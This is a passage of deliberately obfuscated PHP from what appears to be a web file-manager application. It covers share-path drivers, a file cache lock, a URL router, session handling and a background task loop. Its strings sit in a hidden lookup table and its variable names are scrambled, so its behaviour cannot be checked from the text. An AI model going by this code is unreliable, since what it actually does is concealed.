infoSimple($øØ€ô¸ˆ) { return $this->model->sourceInfo($øØ€ô¸ˆ); } public function info($‚ ‘·»¿) { return $this->infoParse($‚ ‘·»¿); } public function infoAuth($™îÆ¶ï°) { return $this->infoParse($™îÆ¶ï°, !1, !0); } public function infoWithChildren($ÛÉØÙË) { return $this->infoParse($ÛÉØÙË, !0); } protected function infoParse($›ãü°â÷, $³ÁÛè†¿ = false, $Úß¹Ò = false) { if (!$³ÁÛè†¿) { return $this->model->pathInfo($›ãü°â÷, $Úß¹Ò); } return $this->model->pathInfoMore($›ãü°â÷); } public function infoFullSimple($º£§Èá€) { $‚ÕŠÌË =& $_SERVER[åÄ¼Ùßš]; $˜è„Ê© = explode($‚ÕŠÌË[8], $º£§Èá€); $•ÕÊø…¦ = implode($‚ÕŠÌË[8], array_splice($˜è„Ê©, 1)); return $this->model->pathInfoByPath($˜è„Ê©[0], $•ÕÊø…¦); } public function infoFull($´âë”ÊÕ) { $Ã–ŸĞè = $this->infoFullSimple($´âë”ÊÕ); return is_array($Ã–ŸĞè) ? $this->model->pathInfo($Ã–ŸĞè[$_SERVER[åÄ¼Ùßš][194]]) : !1; } public function hashSimple($ê¹‘’­Ó) { $Èáé«—ö =& $_SERVER[åÄ¼Ùßš]; $ôÀü€£ï = $this->infoWithChildren($ê¹‘’­Ó); return $ôÀü€£ï[$Èáé«—ö[170]][$Èáé«—ö[688]]; } public function hashMd5($³†ŒÈ™ı) { $¤ÉË¾µ£ =& $_SERVER[åÄ¼Ùßš]; $¢Ó›™ˆÈ = $this->infoWithChildren($³†ŒÈ™ı); return $¢Ó›™ˆÈ[$¤ÉË¾µ£[170]][$¤ÉË¾µ£[560]]; } public function exist($éœš‘ÙÏ) { $Ì¡İŞ±ò =& $_SERVER[åÄ¼Ùßš]; $Œñïä×ù = $this->parse($éœš‘ÙÏ); if (!$Œñïä×ù[$Ì¡İŞ±ò[87]]) { return $this->isFile($éœš‘ÙÏ) || $this->isFolder($éœš‘ÙÏ); } $˜éæ¯é« = array($Ì¡İŞ±ò[489] => $Œñïä×ù[$Ì¡İŞ±ò[484]], $Ì¡İŞ±ò[32] => $Œñïä×ù[$Ì¡İŞ±ò[87]]); $’Ç¦øöÉ = $this->model->where($˜éæ¯é«)->find(); return $’Ç¦øöÉ ? !0 : !1; } public function isFile($“œãÓº¤) { $Ö£¹á÷ =& $_SERVER[åÄ¼Ùßš]; $¶·¿€ãÎ = $this->infoSimple($“œãÓº¤); return $¶·¿€ãÎ && $¶·¿€ãÎ[$Ö£¹á÷[497]] == $Ö£¹á÷[231] ? !0 : !1; } public function isFolder($÷ßÏ†¢à) { $¾¸ù·šå =& $_SERVER[åÄ¼Ùßš]; $ôü’›ÀÓ = $this->infoSimple($÷ßÏ†¢à); return $ôü’›ÀÓ && $ôü’›ÀÓ[$¾¸ù·šå[497]] == $¾¸ù·šå[91] ? !0 : !1; } public function listPath($­¨Ï³æÒ, $¢îäËœÍ = false) { $­³üÊÂï =& $_SERVER[åÄ¼Ùßš]; if ($­¨Ï³æÒ == $­³üÊÂï[12]) { return !1; } $‰»ï¹Å¿ = array($­³üÊÂï[489] => $­¨Ï³æÒ); if ($¢îäËœÍ) { return $this->model->listSource($‰»ï¹Å¿, -1); } return $this->model->listSource($‰»ï¹Å¿); } public function has($ĞöûÑ÷ó, $ÛÏæÌ¶ = false, $˜ˆçŠê³ = null) { $ˆßƒç¥ =& $_SERVER[åÄ¼Ùßš]; $’õ¼¥Âû = $this->infoWithChildren($ĞöûÑ÷ó); if ($ÛÏæÌ¶) { return array($ˆßƒç¥[243] => $’õ¼¥Âû[$ˆßƒç¥[243]], $ˆßƒç¥[242] => $’õ¼¥Âû[$ˆßƒç¥[242]]); } return $˜ˆçŠê³ ? $’õ¼¥Âû[$ˆßƒç¥[243]] : $’õ¼¥Âû[$ˆßƒç¥[242]]; } public function listAll($îı¡¹®æ) { $‡Ê‰Ÿ‡€ = IO::info($this->pathParse[$_SERVER[åÄ¼Ùßš][87]]); if (!$‡Ê‰Ÿ‡€) { return array(); } return $this->model->listAll($îı¡¹®æ); } public function getContent($Ö§æ‚Ìõ) { return $this->model->getContent($Ö§æ‚Ìõ); } public function setContent($Ä’ı©¤ê, $¢€±ƒŸ = '') { return $this->model->setContent($Ä’ı©¤ê, $¢€±ƒŸ); } public function fileSubstr($©Éöº›—, $ĞşØ­ŸÇ, $Ùü·—Î) { return $this->model->fileSubstr($©Éöº›—, $ĞşØ­ŸÇ, $Ùü·—Î); } public function download($¯ÑêŠÜ, $½úò«é« = '') { $½‰‡ü·ê = get_path_father($½úò«é«); $ÃèĞöÛâ = get_path_this($½úò«é«); $©û‹¢ÒĞ = $this->model->fileInfoGet($¯ÑêŠÜ); $Å¦Åª¯À = IO::copy($©û‹¢ÒĞ[$_SERVER[åÄ¼Ùßš][87]], $½‰‡ü·ê, !1, $ÃèĞöÛâ); return $Å¦Åª¯À; } public function setModifyTime($ÖÔÖ’¸¸, $íšÅğÖ = '') { $’ìçÇÇé =& $_SERVER[åÄ¼Ùßš]; if (!$ÖÔÖ’¸¸) { return; } $this->model->where(array($’ìçÇÇé[503] => $ÖÔÖ’¸¸))->save(array($’ìçÇÇé[88] => $íšÅğÖ)); } public function upload($“¤¯øÏÄ, $º°¤Ãê, $ÃÇ¡– = false, $¹‘ıÜÓÇ = REPEAT_REPLACE) { $ö‰ ùÌœ =& $_SERVER[åÄ¼Ùßš]; $¨€ÄòÌ = $this->parse($“¤¯øÏÄ); $Ëõ²ó«¦ = $this->model->addFile($¨€ÄòÌ[$ö‰ ùÌœ[484]], $º°¤Ãê, $¨€ÄòÌ[$ö‰ ùÌœ[87]], $ÃÇ¡–, $¹‘ıÜÓÇ); return $this->getPathOuter($Ëõ²ó«¦); } public function uploadFileByID($ûö¶£, $’Ëşüê—, $Ö£×Í½¿) { $òÂ¬Â‡ =& $_SERVER[åÄ¼Ùßš]; $·œã˜ù  = $this->parse($ûö¶£); $»ş¡ü¿Â = $this->model->addFileByFileID($·œã˜ù [$òÂ¬Â‡[484]], $’Ëşüê—, $·œã˜ù [$òÂ¬Â‡[87]], $Ö£×Í½¿); return $this->getPathOuter($»ş¡ü¿Â); } public function addFileByRemote($ÔĞíÅ», $¾„éæ, $Ôİ«‚¨œ = array(), $ÕĞ‡›ë = '', $ïîìŒ¸ò) { $—ßª˜’ =& $_SERVER[åÄ¼Ùßš]; $×Œ²Óß = $this->parse($ÔĞíÅ»); $ÕĞ‡›ë = empty($ÕĞ‡›ë) ? $×Œ²Óß[$—ßª˜’[87]] : $ÕĞ‡›ë; $ø…ûà‹Ÿ = $this->model->addFileByRemote($×Œ²Óß[$—ßª˜’[484]], $¾„éæ, $ÕĞ‡›ë, $Ôİ«‚¨œ, $ïîìŒ¸ò); return $this->getPathOuter($ø…ûà‹Ÿ); } public function uploadLink($ı€÷Ä¡€, $‘â¬‹ôÅ = 0) { $­§Ê™Åº =& $_SERVER[åÄ¼Ùßš]; $¾ĞÓâï = $this->parse($ı€÷Ä¡€); $Ö™¸×ğõ = _get($GLOBALS[$­§Ê™Åº[7]], $­§Ê™Åº[1468]); $ú‘§™‚¦ = _get($GLOBALS[$­§Ê™Åº[7]], $­§Ê™Åº[1469]); $‘î¬¾±½ = KodIO::ioFileDriverGet($­§Ê™Åº[495] . $¾ĞÓâï[$­§Ê™Åº[484]] . $­§Ê™Åº[404]); $•ë–Ñİø = Model($­§Ê™Åº[690])->createFileName($¾ĞÓâï[$­§Ê™Åº[87]], $‘î¬¾±½, $Ö™¸×ğõ, $ú‘§™‚¦); return IO::uploadLink($•ë–Ñİø, $‘â¬‹ôÅ); } public function fileNameAuto($½ÔßåÓ, $¼—¿€¿Š, $¬„íÎÌ„ = REPEAT_REPLACE, $öñ°õ’¤ = false) { return $this->model->fileNameAuto($½ÔßåÓ, $¼—¿€¿Š, $¬„íÎÌ„, $öñ°õ’¤); } public function fileNameExist($ùŞ«Ãê‹, $Âşú¸­”) { return $this->model->fileNameExist($ùŞ«Ãê‹, $Âşú¸­”); } protected function _fileOut($ÛÛº¹°, $›—ÒŒ›î = false, $…îêğÚˆ = false, $Á†ÛèĞó = '', $‰ì”†ïË = false) { $–™Å²Ğ =& $_SERVER[åÄ¼Ùßš]; $Ú­–ª¹œ = $this->model->sourceInfo($ÛÛº¹°); if ($Ú­–ª¹œ[$–™Å²Ğ[497]] == $–™Å²Ğ[91]) { header($–™Å²Ğ[1470]); die; } $ŸÛ¨ğş˜ = $this->model->fileInfoGet($ÛÛº¹°); $Á†ÛèĞó = $ŸÛ¨ğş˜[$–™Å²Ğ[560]] ? $ŸÛ¨ğş˜[$–™Å²Ğ[560]] : $Á†ÛèĞó; $íÓÊ¾ƒ¶ = isset($GLOBALS[$–™Å²Ğ[183]]) && is_array($GLOBALS[$–™Å²Ğ[183]]) ? $GLOBALS[$–™Å²Ğ[183]][$–™Å²Ğ[32]] : $Ú­–ª¹œ[$–™Å²Ğ[32]]; if ($‰ì”†ïË) { return IO::fileOutServer($ŸÛ¨ğş˜[$–™Å²Ğ[87]], $›—ÒŒ›î, $íÓÊ¾ƒ¶, $Á†ÛèĞó); } IO::fileOut($ŸÛ¨ğş˜[$–™Å²Ğ[87]], $›—ÒŒ›î, $íÓÊ¾ƒ¶, $Á†ÛèĞó); } public function fileOut($øÛîÍù, $Ë…€êĞƒ = false, $Ôõ­¯ ¢ = false, $‰‰ÙÈ€ = '') { $this->_fileOut($øÛîÍù, $Ë…€êĞƒ, $Ôõ­¯ ¢, $‰‰ÙÈ€); } public function fileOutServer($…ŞÁî, $—ˆ¸ÁÇ¨ = false, $ğ’Í×†û = false, $”÷È¢ìô = '') { $this->_fileOut($…ŞÁî, $—ˆ¸ÁÇ¨, $ğ’Í×†û, $”÷È¢ìô, !0); } protected function _fileOutImage($˜ãşÄì±, $çÈ†ó®¾ = 250) { $Í±®¼¯¸ =& $_SERVER[åÄ¼Ùßš]; $¢ åì°á = $this->model->pathInfo($˜ãşÄì±); if ($¢ åì°á[$Í±®¼¯¸[497]] == $Í±®¼¯¸[91]) { show_json($Í±®¼¯¸[1471] . $˜ãşÄì±, !1); } $™ï‰‡ü– = $this->model->fileInfoGet($˜ãşÄì±); $¢ åì°á[$Í±®¼¯¸[184]] = $™ï‰‡ü–[$Í±®¼¯¸[87]]; $GLOBALS[$Í±®¼¯¸[183]] = $¢ åì°á; IO::fileOutImage($™ï‰‡ü–[$Í±®¼¯¸[87]], $çÈ†ó®¾); } public function fileOutImage($­¯ ÏÊ½, $–²¯çï¸ = 250) { $this->_fileOutImage($­¯ ÏÊ½, $–²¯çï¸); } public function fileOutImageServer($ğı¦âø±, $’…ˆ‚şú = 250) { $this->_fileOutImage($ğı¦âø±, $’…ˆ‚şú); } public function link($×è–ÙØ®, $ªã­î› = '') { $Ÿ…Ï¥±› = $this->model->fileInfoGet($×è–ÙØ®); return IO::link($Ÿ…Ï¥±›[$_SERVER[åÄ¼Ùßš][87]], $ªã­î›); } protected function parse($ü¤£Âß¨) { $Ó‰§«—¸ =& $_SERVER[åÄ¼Ùßš]; if (strstr($ü¤£Âß¨, $Ó‰§«—¸[8]) === !1) { return array($Ó‰§«—¸[505] => intval($ü¤£Âß¨), $Ó‰§«—¸[87] => $Ó‰§«—¸[12], $Ó‰§«—¸[1467] => array()); } $“‡Óàã = explode($Ó‰§«—¸[8], trim($ü¤£Âß¨, $Ó‰§«—¸[8])); if (count($“‡Óàã) < 2) { show_tips(clear_html($ü¤£Âß¨) . $Ó‰§«—¸[1472]); } return array($Ó‰§«—¸[505] => intval($“‡Óàã[0]), $Ó‰§«—¸[87] => $“‡Óàã[1], $Ó‰§«—¸[1467] => array_slice($“‡Óàã, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($´‡úà’) { $this->pathParse = $´‡úà’; $this->model = Model($_SERVER[åÄ¼Ùßš][1466]); } public function getPathOuter($¾¥Éñ¥¢) { $§£“óÁØ =& $_SERVER[åÄ¼Ùßš]; if (!$¾¥Éñ¥¢) { return $¾¥Éñ¥¢; } $Ñ²æá‡ã = $this->parse($¾¥Éñ¥¢); return trim(KodIO::makeShare($this->pathParse[$§£“óÁØ[484]], $Ñ²æá‡ã[$§£“óÁØ[484]]), $§£“óÁØ[8]); } protected function infoParse($ëŸÂÎ®¼, $‡å›Ì¬¸ = false, $èÙÆ·îĞ = false) { $ÎÌëùó¤ =& $_SERVER[åÄ¼Ùßš]; $ØØ…ì = $this->pathParse[$ÎÌëùó¤[484]]; $ó·ø’ÔÄ = trim($this->pathParse[$ÎÌëùó¤[1287]], $ÎÌëùó¤[8]); return Action($ÎÌëùó¤[1473])->sharePathInfo($ØØ…ì, $ó·ø’ÔÄ, $‡å›Ì¬¸); } public function infoFull($™Ú¿êâ) { $ÃÎ¾ÀÚ“ =& $_SERVER[åÄ¼Ùßš]; $°÷˜÷­ = explode($ÃÎ¾ÀÚ“[8], trim($™Ú¿êâ, $ÃÎ¾ÀÚ“[8])); if (count($°÷˜÷­) > 1) { $šÇŠç–¸ = implode($ÃÎ¾ÀÚ“[8], array_splice($°÷˜÷­, 1)); $–Í¢¬ü = $this->model->pathInfoByPath($°÷˜÷­[0], $šÇŠç–¸); if (!$–Í¢¬ü) { return !1; } $this->pathParse[$ÃÎ¾ÀÚ“[1287]] = $–Í¢¬ü[$ÃÎ¾ÀÚ“[194]]; } return $this->infoParse($™Ú¿êâ); } public function listAll($šï–Ô¾) { $ ‚™¢ŒÆ =& $_SERVER[åÄ¼Ùßš]; $ƒÉõ¢‡— = IO::info($this->pathParse[$ ‚™¢ŒÆ[87]]); if (!$ƒÉõ¢‡—) { return array(); } $±ƒÀ½Ü´ = $this->model->listAll($šï–Ô¾); $şïÚ¹ìÒ = Model($ ‚™¢ŒÆ[680])->getInfo($ƒÉõ¢‡—[$ ‚™¢ŒÆ[681]]); foreach ($±ƒÀ½Ü´ as &$÷¶æÛåŒ) { check_abort(); $÷¶æÛåŒ[$ ‚™¢ŒÆ[90]] = Action($ ‚™¢ŒÆ[1473])->_shareItemeParse($÷¶æÛåŒ[$ ‚™¢ŒÆ[90]], $şïÚ¹ìÒ); } unset($÷¶æÛåŒ); return $±ƒÀ½Ü´; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($«ŠÅ‰óí) { $this->pathParse = $«ŠÅ‰óí; $this->model = Model($_SERVER[åÄ¼Ùßš][1466]); } protected function infoParse($ÑìßˆÈÓ, $ÛØÜ¿Ü = false, $ıÄíç”¤ = false) { $«ª©ªÚü =& $_SERVER[åÄ¼Ùßš]; return Action($«ª©ªÚü[1294])->sharePathInfo($this->pathParse[$«ª©ªÚü[87]], !0, $ÛØÜ¿Ü); } public function listPath($„ºÖ€€, $Û°ãèœö = false) { $Óö¬´¯ª =& $_SERVER[åÄ¼Ùßš]; $‡Íƒ±éü = parent::listPath($„ºÖ€€, $Û°ãèœö); if (!$‡Íƒ±éü) { return $‡Íƒ±éü; } if (is_array($‡Íƒ±éü[$Óö¬´¯ª[1474]])) { $‡Íƒ±éü[$Óö¬´¯ª[1474]] = Action($Óö¬´¯ª[1294])->shareItemInfo($‡Íƒ±éü[$Óö¬´¯ª[1474]]); } foreach ($‡Íƒ±éü as $Äç´ŞìÁ => $‡Ëçóù) { if (!in_array($Äç´ŞìÁ, array($Óö¬´¯ª[86], $Óö¬´¯ª[85]))) { continue; } foreach ($‡Ëçóù as $Óˆ§Š’â => $ô…’Üà) { $‡Íƒ±éü[$Äç´ŞìÁ][$Óˆ§Š’â] = Action($Óö¬´¯ª[1294])->shareItemInfo($ô…’Üà); } } return $‡Íƒ±éü; } public function listAll($æ„‡ëõ£) { $èÜ¨ºÉ° =& $_SERVER[åÄ¼Ùßš]; $«á™° = IO::info($this->pathParse[$èÜ¨ºÉ°[87]]); if (!$«á™°) { return array(); } $ßÄŸ¡÷® = $this->model->listAll($æ„‡ëõ£); foreach ($ßÄŸ¡÷® as &$½üÚ‘Ñ§) { $½üÚ‘Ñ§[$èÜ¨ºÉ°[90]] = Action($èÜ¨ºÉ°[1294])->shareItemInfo($½üÚ‘Ñ§[$èÜ¨ºÉ°[90]]); } unset($½üÚ‘Ñ§); return $ßÄŸ¡÷®; } } goto aÑ­ß¼; cÏÈÖæš³¡: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ç€»ş­× =& $_SERVER[åÄ¼Ùßš]; $ÕáÈ¾ÃÒ = $GLOBALS[$ç€»ş­×[6]][$ç€»ş­×[426]]; self::$cachePath = $ÕáÈ¾ÃÒ[$ç€»ş­×[233]][$ç€»ş­×[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($°¼ÌáÎ¯, $ê™Óâñ™ = 0) { $å—Å¨Ù =& $_SERVER[åÄ¼Ùßš]; $ñ¢¡Õ¢‹ = microtime(!0); $‚±÷ï…ú = $ñ¢¡Õ¢‹ + $ê™Óâñ™ + 0.0001; $Â”ìõ£ = rtrim(self::$cachePath, $å—Å¨Ù[8]) . $å—Å¨Ù[969] . md5($°¼ÌáÎ¯) . $å—Å¨Ù[966]; if (file_exists($Â”ìõ£) && filemtime($Â”ìõ£) && filemtime($Â”ìõ£) < time() - 10) { @unlink($Â”ìõ£); } do { if (file_exists($Â”ìõ£)) { cacheLockWait(); continue; } $ˆØš¸”å = fopen($Â”ìõ£, $å—Å¨Ù[970]); if (!$ˆØš¸”å) { return !1; } $¬Ù©Õé = flock($ˆØš¸”å, LOCK_EX | LOCK_NB); self::$caches[$°¼ÌáÎ¯] = array($å—Å¨Ù[971] => $ˆØš¸”å, $å—Å¨Ù[233] => $Â”ìõ£); fwrite($ˆØš¸”å, $‚±÷ï…ú); clearstatcache(); if ($ˆØš¸”å && $¬Ù©Õé) { return !0; } cacheLockWait(); } while (microtime(!0) < $‚±÷ï…ú); $this->unlock($°¼ÌáÎ¯); return !1; } public function lockGet($¥İİåé€) { $êÕòí×Ü =& $_SERVER[åÄ¼Ùßš]; $åá¼¸­É = rtrim(self::$cachePath, $êÕòí×Ü[8]) . $êÕòí×Ü[969] . md5($¥İİåé€) . $êÕòí×Ü[966]; return file_exists($åá¼¸­É); } public function unlock($¡÷½İ“) { $Ûİ¢ºÛ– =& $_SERVER[åÄ¼Ùßš]; $¹¬¿¨ƒ© = self::$caches[$¡÷½İ“]; if (!$¹¬¿¨ƒ©) { return; } @flock($¹¬¿¨ƒ©[$Ûİ¢ºÛ–[971]], LOCK_UN); @fclose($¹¬¿¨ƒ©[$Ûİ¢ºÛ–[971]]); @unlink($¹¬¿¨ƒ©[$Ûİ¢ºÛ–[233]]); unset(self::$caches[$¡÷½İ“]); } } $_file = $_SERVER[$_SERVER[åÄ¼Ùßš][840]]; goto dóœã£“½³; b¡°âø‰¦Ï: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\x79" => "\133\x5e\x2f\x5d\53", "\x3a\x6e\x75\x6d" => "\133\60\x2d\x39\x5d\53", "\x3a\x61\154\154" => "\56\x2a"); public static $errorCallback; public static function __callstatic($ŸìÜÍ¥ˆ, $ÏœÚÎòı) { $´¿Üé¿İ =& $_SERVER[åÄ¼Ùßš]; if ($ŸìÜÍ¥ˆ == $´¿Üé¿İ[1752]) { $¢Ïá²áŞ = array_map($´¿Üé¿İ[1753], $ÏœÚÎòı[0]); $ˆ¬ ©Ãù = strpos($ÏœÚÎòı[1], $´¿Üé¿İ[8]) === 0 ? $ÏœÚÎòı[1] : $´¿Üé¿İ[8] . $ÏœÚÎòı[1]; $¨¢…ãÓÀ = $ÏœÚÎòı[2]; } else { $¢Ïá²áŞ = null; $ˆ¬ ©Ãù = strpos($ÏœÚÎòı[0], $´¿Üé¿İ[8]) === 0 ? $ÏœÚÎòı[0] : $´¿Üé¿İ[8] . $ÏœÚÎòı[0]; $¨¢…ãÓÀ = $ÏœÚÎòı[1]; } array_push(self::$maps, $¢Ïá²áŞ); array_push(self::$routes, $ˆ¬ ©Ãù); array_push(self::$methods, strtoupper($ŸìÜÍ¥ˆ)); array_push(self::$callbacks, $¨¢…ãÓÀ); } public static function error($œÙÇÃÕÄ) { self::$errorCallback = $œÙÇÃÕÄ; } public static function haltOnMatch($úÛøı¾ë = true) { self::$halts = $úÛøı¾ë; } public static function dispatch() { $å´ñÉ£ =& $_SERVER[åÄ¼Ùßš]; $¸Ï‘Àš„ = parse_url($_SERVER[$å´ñÉ£[1754]], PHP_URL_PATH); $”ÈôÖÌ¾ = $_SERVER[$å´ñÉ£[164]]; $ôÍ—£ı¼ = array_keys(static::$patterns); $Îóå²õÖ = array_values(static::$patterns); $õ•½½¸« = !1; self::$routes = preg_replace($å´ñÉ£[1399], $å´ñÉ£[8], self::$routes); if (in_array($¸Ï‘Àš„, self::$routes)) { $Ùİ›¨½¸ = array_keys(self::$routes, $¸Ï‘Àš„); foreach ($Ùİ›¨½¸ as $â¸Œœ¬„) { if (self::$methods[$â¸Œœ¬„] == $”ÈôÖÌ¾ || self::$methods[$â¸Œœ¬„] == $å´ñÉ£[1755] || in_array($”ÈôÖÌ¾, self::$maps[$â¸Œœ¬„])) { $õ•½½¸« = !0; if (!is_object(self::$callbacks[$â¸Œœ¬„])) { $òŠÄóÚü = explode($å´ñÉ£[8], self::$callbacks[$â¸Œœ¬„]); $¿î¡ÒĞ = end($òŠÄóÚü); $¦µ â÷ù = explode($å´ñÉ£[1331], $¿î¡ÒĞ); $˜Èğ–‘· = new $¦µ â÷ù[0](); $˜Èğ–‘·->{$¦µ â÷ù[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$â¸Œœ¬„]); if (self::$halts) { return; } } } } } else { $¨‚Óµ¯¡ = 0; foreach (self::$routes as $â¸Œœ¬„) { if (strpos($â¸Œœ¬„, $å´ñÉ£[4]) !== !1) { $â¸Œœ¬„ = str_replace($ôÍ—£ı¼, $Îóå²õÖ, $â¸Œœ¬„); } if (preg_match($å´ñÉ£[1756] . $â¸Œœ¬„ . $å´ñÉ£[1757], $¸Ï‘Àš„, $°±ïÛ‡â)) { if (self::$methods[$¨‚Óµ¯¡] == $”ÈôÖÌ¾ || self::$methods[$¨‚Óµ¯¡] == $å´ñÉ£[1755] || !empty(self::$maps[$¨‚Óµ¯¡]) && in_array($”ÈôÖÌ¾, self::$maps[$¨‚Óµ¯¡])) { $õ•½½¸« = !0; array_shift($°±ïÛ‡â); if (!is_object(self::$callbacks[$¨‚Óµ¯¡])) { $òŠÄóÚü = explode($å´ñÉ£[8], self::$callbacks[$¨‚Óµ¯¡]); $¿î¡ÒĞ = end($òŠÄóÚü); $¦µ â÷ù = explode($å´ñÉ£[1331], $¿î¡ÒĞ); $˜Èğ–‘· = new $¦µ â÷ù[0](); if (!method_exists($˜Èğ–‘·, $¦µ â÷ù[1])) { echo $å´ñÉ£[1758]; } else { call_user_func_array(array($˜Èğ–‘·, $¦µ â÷ù[1]), $°±ïÛ‡â); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$¨‚Óµ¯¡], $°±ïÛ‡â); if (self::$halts) { return; } } } } $¨‚Óµ¯¡++; } } if ($õ•½½¸« == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $Ç«›÷ =& $_SERVER[åÄ¼Ùßš]; header($_SERVER[$Ç«›÷[1759]] . $Ç«›÷[1760]); echo $Ç«›÷[1761]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$å´ñÉ£[1754]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ÜÑø»©Ö =& $_SERVER[åÄ¼Ùßš]; static $«¢Üä€ = false; if ($«¢Üä€) { return $«¢Üä€; } $ÕíÓ½®• = $GLOBALS[$ÜÑø»©Ö[6]][$ÜÑø»©Ö[426]]; self::$sessionTime = $ÕíÓ½®•[$ÜÑø»©Ö[1762]]; $¡æà«®Ç = isset($GLOBALS[$ÜÑø»©Ö[1763]]) ? $GLOBALS[$ÜÑø»©Ö[1763]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($¡æà«®Ç)) { self::$sessionSign = Cookie::get($¡æà«®Ç); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($¡æà«®Ç, self::$sessionSign, self::$sessionTime); $¿—ü»øã = $ÕíÓ½®•[$ÜÑø»©Ö[1764]]; $ßÍ ¶ÇÍ = $ÕíÓ½®•[$¿—ü»øã]; $¿Àİ›Š¿ = $ÕíÓ½®•[$ÜÑø»©Ö[929]]; switch ($¿—ü»øã) { case $ÜÑø»©Ö[21]: self::$handle = Model($ÜÑø»©Ö[930]); break; case $ÜÑø»©Ö[931]: self::$handle = new CacheRedis($ßÍ ¶ÇÍ, $¿Àİ›Š¿); break; case $ÜÑø»©Ö[932]: self::$handle = new CacheMemcached($ßÍ ¶ÇÍ, $¿Àİ›Š¿); break; case $ÜÑø»©Ö[233]: $ßÍ ¶ÇÍ[$ÜÑø»©Ö[87]] = $ßÍ ¶ÇÍ[$ÜÑø»©Ö[87]] . $ÜÑø»©Ö[1765]; self::$handle = new CacheFile($ßÍ ¶ÇÍ, $¿Àİ›Š¿); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $«¢Üä€ = new self(); return $«¢Üä€; } public static function getBySign($Æ´ÕÏŠµ) { $†øêì³ = self::$handle->get($Æ´ÕÏŠµ); $†øêì³ = unserialize($†øêì³); return is_array($†øêì³) ? $†øêì³ : array(); } public static function setBySign($õş¼¾², $“ş—¸Â‡) { CacheLock::lock($õş¼¾²); self::$handle->set($õş¼¾², serialize($“ş—¸Â‡), self::$sessionTime); CacheLock::unlock($õş¼¾²); } public static function sign($°ü¢ ¶Ñ = false) { if ($°ü¢ ¶Ñ) { self::$sessionSign = $°ü¢ ¶Ñ; } self::init(); return self::$sessionSign; } public static function set($Ò©íŞ¾à, $‘¬Ÿ…¢Û = false) { self::init(); if (is_array($Ò©íŞ¾à)) { foreach ($Ò©íŞ¾à as $œ½ª => $à¾ÊÌ÷) { array_set_value(self::$data, $œ½ª, $à¾ÊÌ÷); } } else { array_set_value(self::$data, $Ò©íŞ¾à, $‘¬Ÿ…¢Û); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ƒçŒŸô© = false) { self::init(); if (!$ƒçŒŸô©) { return self::$data; } return array_get_value(self::$data, $ƒçŒŸô©); } public static function remove($óÎÊÜ¸ö) { self::init(); unset(self::$data[$óÎÊÜ¸ö]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[åÄ¼Ùßš][938])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ôì¨÷¶˜ =& $_SERVER[åÄ¼Ùßš]; if (self::valueGet($ôì¨÷¶˜[843]) != $ôì¨÷¶˜[91]) { return; } if (self::valueGet($ôì¨÷¶˜[1766]) == $ôì¨÷¶˜[91]) { $ˆúœí÷¨ = self::valueGet($ôì¨÷¶˜[1767]); if (time() - $ˆúœí÷¨ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($ôì¨÷¶˜[1766], $ôì¨÷¶˜[91]); self::log($ôì¨÷¶˜[1768] . ACTION . $ôì¨÷¶˜[1769]); Hook::bind($ôì¨÷¶˜[1770], $ôì¨÷¶˜[1771]); $¼üıı¢ = 0; while (!0) { self::cacheClear(); if (self::valueGet($ôì¨÷¶˜[843]) != $ôì¨÷¶˜[91]) { self::valueSet($ôì¨÷¶˜[1766], $ôì¨÷¶˜[231]); self::log($ôì¨÷¶˜[1772]); die; } $Ù­ĞÛïá = time(); if ($Ù­ĞÛïá - $¼üıı¢ >= 60) { self::valueSet(array($ôì¨÷¶˜[1766] => $ôì¨÷¶˜[91], $ôì¨÷¶˜[1767] => $Ù­ĞÛïá)); $¼üıı¢ = $Ù­ĞÛïá; } if (!file_exists(USER_SYSTEM . $ôì¨÷¶˜[1773])) { self::valueSet(array($ôì¨÷¶˜[1766] => $ôì¨÷¶˜[231], $ôì¨÷¶˜[843] => $ôì¨÷¶˜[231])); self::log($ôì¨÷¶˜[1774]); die; } $·¹Ÿçá = file_get_contents(BASIC_PATH . $ôì¨÷¶˜[1775]); $âÉ‡ê¥  = KOD_VERSION . $ôì¨÷¶˜[10] . KOD_VERSION_BUILD; $å‚û„úù = match_text($·¹Ÿçá, $ôì¨÷¶˜[1776]) . $ôì¨÷¶˜[10] . match_text($·¹Ÿçá, $ôì¨÷¶˜[1777]); if ($å‚û„úù != $âÉ‡ê¥ ) { self::restart(); self::log("\163\x74\x6f\x70\145\144\x2e\x5b\x76\145\162\163\151\157\x6e\x20\x75\160\x64\x61\164\x65\x3b{$versionNow}\40\75\x3e\40{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $ë†ÂùÓ› =& $_SERVER[åÄ¼Ùßš]; http_close(); $GLOBALS[$ë†ÂùÓ›[1778]] = 1; $_SERVER[$ë†ÂùÓ›[1779]] = $ë†ÂùÓ›[1780]; $_COOKIE = array(); $GLOBALS[$ë†ÂùÓ›[1781]] = 1; $GLOBALS[$ë†ÂùÓ›[1782]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $¢æ³ ™Ç =& 